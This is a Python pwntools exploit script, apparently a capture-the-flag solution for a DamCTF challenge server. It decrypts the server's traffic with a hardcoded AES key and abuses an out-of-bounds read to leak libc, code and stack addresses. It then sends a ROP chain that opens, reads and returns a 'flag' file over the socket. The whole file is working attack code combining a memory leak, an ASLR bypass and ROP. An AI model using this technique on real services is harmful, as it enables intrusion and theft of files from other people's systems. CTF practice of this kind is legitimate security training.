#!/usr/bin/env python3

from Crypto.Cipher import AES
from pwn import *
from pathlib import Path
import time

context.update(arch='amd64', os='linux')
elf = ELF('./server')
libc = ELF('./libc.so.6')

# server = gdb.debug(['./server', '-t', '99999', '-p', '31338'], env={'LD_PRELOAD': './libc.so.6:./libm.so.6'}, gdbscript="set follow-fork-mode child\nb *get_coords_from_message\nc\n")
# sleep(2)
p = remote('chals.damctf.xyz', 30193)

def decrypt_message(m):
    key = b'sUp3r_S3cuR3_keY'
    iv = m[:16]
    ctxt = m[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.decrypt(ctxt)

def send_message(msg_type, message):
    p.send(f'{msg_type}{len(message):06d} '.encode())
    p.send(message)

def receive_message():
    # Get expected number of bytes
    from_host_bytes = p.recvn(8)
    expected_bytes = int(from_host_bytes[1:-1].decode())
    return p.recvn(expected_bytes)

def encode_payload(payload):
    # Encode the payload as comma-separated integers for each 4 byte chunk
    # Pad to 4 bytes
    payload += b'\x00' * (len(payload) % 4)
    coords = []
    for i in range(0, len(payload), 4):
       coords += [str(int.from_bytes(payload[i:i+4], 'little')).encode()]
    return b','.join(coords)

# handshake
send_message('h', b'hello')
receive_message()

# read first out of bounds thing to get libc leak
send_message('d', b'9,9,10')
leaks_str = decrypt_message(receive_message()).strip(b'\x00')
print('server:', leaks_str)

libc_leak = unpack(leaks_str[176:176+8], 'all')
code_leak = unpack(leaks_str[64:64+8], 'all')
stack_leak = unpack(leaks_str[56:56+8], 'all')
rsp = stack_leak - 104
sock_fd = unpack(leaks_str[16:16+8], 'all')
libc.address = libc_leak - 171408
elf.address = code_leak - 10844
print(f'{hex(libc.address)=}')
print(f'{hex(elf.address)=}')
print(f'{hex(stack_leak)=}')
print(f'{hex(rsp)=}')

# get to return address
payload = b',' * 11

# Create payload
rop = ROP((libc, elf), base=rsp)
rop.open(b'flag', 0)
# rop.raw(p64(libc.address + 0x41563)) # push rax
# rop.raw(p64(libc.address + 0x2a3e5)) # pop rdi
# rop(rsi=rsp+0x200, rdx=100)
rop.read(3, rsp+0x200, 100)
rop.send(sock_fd, rsp+0x200, 100, 0)

print(rop.dump())

# Encode payload
payload += encode_payload(rop.chain())
# Send payload
send_message('d', payload)
print('sent payload')
print(receive_message())
# Send quit message
send_message('e', b'asdf')

p.interactive()

